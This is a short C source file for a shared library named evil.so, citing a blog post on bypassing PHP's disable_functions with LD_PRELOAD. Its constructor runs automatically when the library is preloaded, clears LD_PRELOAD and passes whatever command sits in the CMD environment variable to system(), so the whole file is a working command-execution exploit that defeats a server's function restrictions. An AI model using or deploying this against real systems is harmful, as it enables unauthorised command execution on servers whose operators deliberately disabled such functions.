// https://blog.1pwnch.com/websecurity/2019/04/08/Bypass-disablefuncs-with-LDPRELOAD/
// gcc -shared -fPIC evil.c -o evil.so
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

__attribute__ ((__constructor__)) void angel (void){
    unsetenv("LD_PRELOAD");
    const char* cmd = getenv("CMD");
    system(cmd);
}
